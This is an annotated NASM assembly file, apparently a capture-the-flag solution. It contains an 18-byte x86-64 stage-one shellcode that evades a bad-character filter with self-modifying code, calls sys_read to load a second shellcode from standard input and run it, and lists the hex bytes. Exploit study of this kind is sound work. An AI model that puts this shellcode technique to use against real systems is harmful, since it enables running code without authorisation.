;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; I don't known why $rax == $rip at the beginning, and
; why the code-section is writeable. Maybe they are just
; secrete weapons the game designer gives to the players.
; I use these two weapons to do a 'sys_read' to read from
; STDIN and write the input at [$rax], then I can input
; another shellcode at STDIN, and they will be executed
; after the 'sys_read' done. Note: the second shellcode
; input at STDIN has only 1 bad bytes: '\n'.

; To do this 'sys_read', I need to set:
;	$rax = 0			(System call id, '0' for sys_read)
;	$rdi = 0			(Input file descriptor, '0' for STDIN)
;	$rsi = old $rax		(Address of the buffer which receives input data)
;	$rdi = count		(How many bytes to read)
; then do a 'syscall'.

; The original codes are:
;	sub edx, edx
;	mov edi, edx
;	mov esi, edx
;	mov dl, count
;	xchg rsi, rax	; 48 96
;	syscall			; 0f 05

; Only the last two instructions have bad bytes.
; So I write an dword (0x050f9648/2) in the codes.
; And then shift this dword back to original bytes.

; Below is the main shellcode which do the 'sys_read',
; it is only 18 bytes.

[BITS 64]

[SECTION .AAA EXEC WRITE]	; do not name this section ".TEXT", otherwise 
							; 'ld' will mark this section READONLY
	global _start

_start:
	; lea rax, [REL _begin]	; now rax points to _begin

_begin:
	sub edx, edx
	mov edi, edx
	mov esi, edx
	mov dl, _shr - _begin
	shl dword [rax+rdx], 1
	mov dl, 31			; length of the other shellcode
	nop
_shr:
	dd 0x050f9648/2
	; xchg rsi, rax		; 48 96
	; syscall			; 0f 05

; hex bytes:
; \x29\xd2\x89\xd7\x89\xd6\xb2\x0e\xd1\x24\x10\xb2\x1f\x90\x24\xcb\x87\x02

; Now you can input another shellcode(without bad chars' limit) to excute.
